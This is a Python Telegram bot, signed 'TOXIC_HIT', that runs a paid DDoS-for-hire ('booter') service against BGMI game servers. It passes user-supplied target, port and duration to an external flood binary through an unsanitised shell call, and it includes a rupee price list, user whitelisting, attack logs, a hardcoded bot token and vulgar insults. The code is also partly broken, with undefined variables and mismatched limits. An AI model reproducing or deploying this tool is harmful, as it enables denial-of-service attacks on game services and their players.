#!/usr/bin/python3
#𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('6426004291:AAFJZhNGexyBywv1DYkJ5y1gyVRgJvNrMsM')

# Admin user IDs
admin_id = ["5121287110"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "phle se hi hai."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈 ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈 ."

    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈."

    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈."

        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n😈𝐁𝐘𝐄 𝐁𝐘𝐄 𝐓𝐎𝐗𝐈𝐂 𝐇𝐈𝐓 𝐍𝐀 𝐌𝐀𝐀 𝐂𝐇𝐎𝐃 𝐃𝐈 𝐁𝐆𝐌𝐈 𝐊𝐈😈"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
                response = "𝐘𝐎𝐔 𝐀𝐑𝐄 𝐎𝐍 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍. 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 𝟏𝐌𝐈𝐍 𝐁𝐄𝐅𝐎𝐑𝐄 𝐑𝐔𝐍𝐍𝐈𝐍𝐆 𝐓𝐇𝐄 /bgmi 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐀𝐆𝐀𝐈𝐍."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 300:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Usage :- /bgmi <target> <port> <time>\n𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓"  # Updated command syntax
    else:
        response = "𝐘𝐎𝐔 𝐀𝐑𝐄 𝐍𝐎𝐓🚫 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐒𝐄𝐃 𝐓𝐎 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.\n𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈."


    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:    
     
/bgmi : 𝐌𝐄𝐓𝐇𝐎𝐃 𝐅𝐎𝐑 𝐁𝐆𝐌𝐈 𝐒𝐄𝐑𝐕𝐄𝐑𝐒. 

/rules : 𝐏𝐋𝐄𝐀𝐒𝐄 𝐂𝐇𝐄𝐂𝐊 𝐁𝐄𝐅𝐎𝐑𝐄 𝐔𝐒𝐄 !!.  
 
/mylogs : 𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐘𝐎𝐔𝐑 𝐑𝐄𝐂𝐄𝐍𝐓𝐒 𝐀𝐓𝐓𝐀𝐂𝐊𝐒.

/plan : 𝐂𝐇𝐄𝐂𝐊𝐎𝐔𝐓 𝐎𝐔𝐑 𝐁𝐎𝐑𝐍𝐄𝐑 𝐑𝐀𝐓𝐄𝐒.   
𝐓𝐎 𝐒𝐄𝐄 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:    

/admincmd: 𝐒𝐇𝐎𝐖𝐒 𝐀𝐋𝐋 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒.
𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"𝙃𝙄 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙏𝙊𝙓𝙄𝘾 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏''''.\nhttps://t.me/+nI0e8Kun6_s1Mjg1'''.   \n𝐓𝐎 𝐒𝐓𝐀𝐑𝐓 𝐓𝐇𝐄 𝐁𝐎𝐓 𝐓𝐘𝐏𝐄 : /help'''. \n𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐖𝐎𝐑𝐋𝐃 𝐁𝐄𝐒𝐓 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓''.\n𝐁𝐘 𝐓𝐎𝐗𝐈𝐂 𝐇𝐈𝐓"
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐏𝐋𝐄𝐀𝐒𝐄 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐄 𝐑𝐔𝐋𝐄𝐒:

1. 𝐃𝐎𝐍'𝐓 𝐑𝐔𝐍 𝐓𝐎 𝐌𝐀𝐍𝐘 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 !! 𝐂𝐀𝐔𝐒𝐄 𝐀 𝐁𝐀𝐍 𝐅𝐑𝐎𝐌 𝐁𝐎𝐓

2. 𝐃𝐎𝐍'𝐓 𝐑𝐔𝐍 𝟐 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝐀𝐓 𝐒𝐀𝐌𝐄 𝐓𝐈𝐌𝐄 𝐁𝐄𝐂𝐀𝐔𝐒𝐄 𝐈𝐅 𝐔 𝐓𝐇𝐄𝐍 𝐔 𝐆𝐎𝐓 𝐁𝐀𝐍𝐍𝐄𝐃 𝐅𝐑𝐎𝐌 𝐁𝐎𝐓. 

3. 𝐖𝐄 𝐃𝐀𝐈𝐋𝐘 𝐂𝐇𝐄𝐂𝐊𝐒 𝐓𝐇𝐄 𝐋𝐎𝐆𝐒 𝐒𝐎 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐄𝐒𝐄 𝐑𝐔𝐋𝐄𝐒 𝐓𝐎 𝐀𝐕𝐎𝐈𝐃 𝐁𝐀𝐍!!

𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐁𝐑𝐎𝐓𝐇𝐄𝐑 𝐎𝐍𝐋𝐘 𝟏 𝐏𝐋𝐀𝐍 𝐈𝐒 𝐏𝐎𝐖𝐄𝐑𝐅𝐔𝐋 𝐓𝐇𝐄𝐍 𝐎𝐓𝐇𝐄𝐑 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓 !!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Pr-ice List:
Day-->150 Rs
Week-->900 Rs
Month-->1600 Rs 
𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "😈𝐄𝐊 𝐆𝐀𝐍𝐃 𝐏𝐀𝐑 𝐑𝐀𝐇𝐄𝐏𝐓𝐀 𝐌𝐀𝐑𝐀 𝐍𝐀 𝐇𝐆𝐓𝐀 𝐅𝐇𝐈𝐑𝐄𝐆𝐀 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐒𝐄 𝐌𝐀𝐑𝐖𝐀 𝐑𝐀𝐇𝐀😈."


    bot.reply_to(message, response)




bot.polling()
#𝐁𝐘 𝐓𝐎𝐗𝐈𝐂_𝐇𝐈𝐓